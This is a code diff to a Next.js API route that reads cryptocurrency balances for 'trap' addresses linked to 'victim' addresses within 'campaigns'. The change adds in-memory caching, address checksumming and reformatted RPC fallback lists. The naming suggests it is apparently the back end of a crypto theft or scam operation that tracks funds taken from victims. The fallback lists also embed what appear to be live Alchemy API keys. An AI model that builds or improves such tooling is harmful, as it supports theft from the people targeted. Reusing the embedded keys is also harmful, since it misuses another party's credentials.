@@ -1,7 +1,7 @@
 import { NextRequest, NextResponse } from 'next/server';
 import { getAuthUser } from '@app-lib/auth';
 import { createServerSupabaseClient } from '@app-lib/supabaseServer';
-import { createPublicClient, http, formatEther, formatUnits, fallback } from 'viem';
+import { createPublicClient, http, formatEther, formatUnits, fallback, getAddress } from 'viem';
 import { mainnet, bsc, polygon } from 'viem/chains';
 
 const chainMap = { ethereum: mainnet, bsc, polygon };
@@ -56,6 +56,22 @@ const ERC20_ABI = [
   },
 ] as const;
 
+// ─── In‑Memory Cache ───
+const balancesCache = new Map<string, { data: any; timestamp: number }>();
+const CACHE_TTL_MS = parseInt(process.env.BALANCES_CACHE_TTL_MS || '60000', 10); // default 1 min
+
+function getCachedBalances(campaignId: string) {
+  const cached = balancesCache.get(campaignId);
+  if (cached && Date.now() - cached.timestamp < CACHE_TTL_MS) {
+    return cached.data;
+  }
+  return null;
+}
+
+function setCachedBalances(campaignId: string, data: any) {
+  balancesCache.set(campaignId, { data, timestamp: Date.now() });
+}
+
 export async function GET(
   req: NextRequest,
   { params }: { params: Promise<{ id: string }> }
@@ -66,6 +82,13 @@ export async function GET(
     const user = await getAuthUser();
     if (!user) {
       return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
+    }
+
+    // ─── Check cache ───
+    const cached = getCachedBalances(id);
+    if (cached) {
+      console.log(`[balances] Returning cached balances for campaign ${id}`);
+      return NextResponse.json(cached);
     }
 
     const supabase = await createServerSupabaseClient();
@@ -95,7 +118,9 @@ export async function GET(
     }
 
     if (!traps || traps.length === 0) {
-      return NextResponse.json({ balances: [] });
+      const emptyResponse = { balances: [] };
+      setCachedBalances(id, emptyResponse);
+      return NextResponse.json(emptyResponse);
     }
 
     // Dynamic environmental resolution logic
@@ -114,48 +139,48 @@ export async function GET(
       return NextResponse.json({ error: 'Unsupported chain' }, { status: 400 });
     }
 
-   // ─── Public RPC Fallbacks ───
-const PUBLIC_FALLBACKS: Record<string, string[]> = {
-  bsc: [
-    'https://bsc-dataseed.binance.org',
-    'https://rpc.ankr.com/bsc',
-    'https://bsc.publicnode.com',
-    'https://1rpc.io/bnb',
-    'https://bsc.drpc.org',
-    'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
-    'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
-  ],
-  polygon: [
-    'https://polygon-rpc.com',
-    'https://rpc.ankr.com/polygon',
-    'https://polygon.llamarpc.com',
-    'https://polygon.publicnode.com',
-    'https://1rpc.io/polygon',
-    'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
-    'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
-  ],
-  ethereum: [
-    'https://ethereum.publicnode.com',
-    'https://rpc.ankr.com/eth',
-    'https://eth.llamarpc.com',
-    'https://1rpc.io/eth',
-    'https://eth.drpc.org',
-    'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
-    'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
-  ],
-};
+    // ─── Public RPC Fallbacks ───
+    const PUBLIC_FALLBACKS: Record<string, string[]> = {
+      bsc: [
+        'https://bsc-dataseed.binance.org',
+        'https://rpc.ankr.com/bsc',
+        'https://bsc.publicnode.com',
+        'https://1rpc.io/bnb',
+        'https://bsc.drpc.org',
+        'https://bnb-mainnet.g.alchemy.com/v2/LW3i2zPypSVe0cl4BxCxI',
+        'https://bnb-mainnet.g.alchemy.com/v2/alch_WQp652MAlfKFbtD1A-zNh'
+      ],
+      polygon: [
+        'https://polygon-rpc.com',
+        'https://rpc.ankr.com/polygon',
+        'https://polygon.llamarpc.com',
+        'https://polygon.publicnode.com',
+        'https://1rpc.io/polygon',
+        'https://polygon-mainnet.g.alchemy.com/v2/c6MIVgnVjXC0kgDH4BItE',
+        'https://polygon-mainnet.g.alchemy.com/v2/alch_3_N_bgLVSl1zoRzlypO11'
+      ],
+      ethereum: [
+        'https://ethereum.publicnode.com',
+        'https://rpc.ankr.com/eth',
+        'https://eth.llamarpc.com',
+        'https://1rpc.io/eth',
+        'https://eth.drpc.org',
+        'https://eth-mainnet.g.alchemy.com/v2/gODtbeuBQLkTJAm3e9tB1',
+        'https://eth-mainnet.g.alchemy.com/v2/GsO461DZvmNGh4O4Ss5Et'
+      ],
+    };
 
-const normalizedChain = campaign.chain?.toLowerCase() || '';
-const rawUrls = [rpcUrl, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
-const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));
+    const normalizedChain = campaign.chain?.toLowerCase() || '';
+    const rawUrls = [rpcUrl, ...(PUBLIC_FALLBACKS[normalizedChain] || [])];
+    const fallbackUrls = Array.from(new Set(rawUrls.filter(Boolean)));
 
-const client = createPublicClient({
-  chain,
-  transport: fallback(
-    fallbackUrls.map(url => http(url, { timeout: 15000 })),
-    { rank: false }
-  ),
-});
+    const client = createPublicClient({
+      chain,
+      transport: fallback(
+        fallbackUrls.map(url => http(url, { timeout: 15000 })),
+        { rank: false }
+      ),
+    });
 
     const tokenAddresses = tokenMap[campaign.chain as keyof typeof tokenMap] || {};
     const decimalsForChain = tokenDecimalsMap[campaign.chain as keyof typeof tokenDecimalsMap] || {};
@@ -164,6 +189,7 @@ const client = createPublicClient({
 
     for (const trap of traps) {
       const address = trap.trap_address as `0x${string}`;
+      const checksummedAddress = getAddress(address);
       const result: any = {
         trapAddress: address,
         victimAddress: trap.victim_address,
@@ -175,7 +201,7 @@ const client = createPublicClient({
 
       // Native Asset Balance Collection
       try {
-        const balance = await client.getBalance({ address });
+        const balance = await client.getBalance({ address: checksummedAddress });
         result.native = formatEther(balance);
       } catch (e) {
         const errMsg = e instanceof Error ? e.message : String(e);
@@ -184,16 +210,16 @@ const client = createPublicClient({
       }
 
       // Token Asset Balance Collection Loop
-      for (const [symbol, tokenAddr] of Object.entries(tokenAddresses)) {
+      for (const [symbol, rawTokenAddr] of Object.entries(tokenAddresses)) {
         try {
+          const tokenAddr = getAddress(rawTokenAddr);
           const balance = await client.readContract({
-            address: tokenAddr as `0x${string}`,
+            address: tokenAddr,
             abi: ERC20_ABI,
             functionName: 'balanceOf',
-            args: [address],
+            args: [checksummedAddress],
           }) as bigint;
 
-          // Process using exact token configurations, default back to 18 decimals
           const decimals = decimalsForChain[symbol] ?? 18;
           result.tokens[symbol] = formatUnits(balance, decimals);
         } catch (e) {
@@ -211,9 +237,7 @@ const client = createPublicClient({
         result.tokens['USDC'] = (nativeUsdc + bridgedUsdc).toString();
       }
 
-      // Debug log to verify what is returned
       console.log(`[balances] Tokens for ${address}:`, result.tokens);
-
       results.push(result);
     }
 
@@ -221,7 +245,11 @@ const client = createPublicClient({
       console.warn('[balances] Encountered errors during execution pipeline:', errors.slice(0, 5));
     }
 
-    return NextResponse.json({ balances: results });
+    const response = { balances: results };
+    // ─── Store in cache ───
+    setCachedBalances(id, response);
+
+    return NextResponse.json(response);
   } catch (err) {
     console.error('[balances] Unexpected critical fallback error:', err);
     return NextResponse.json(
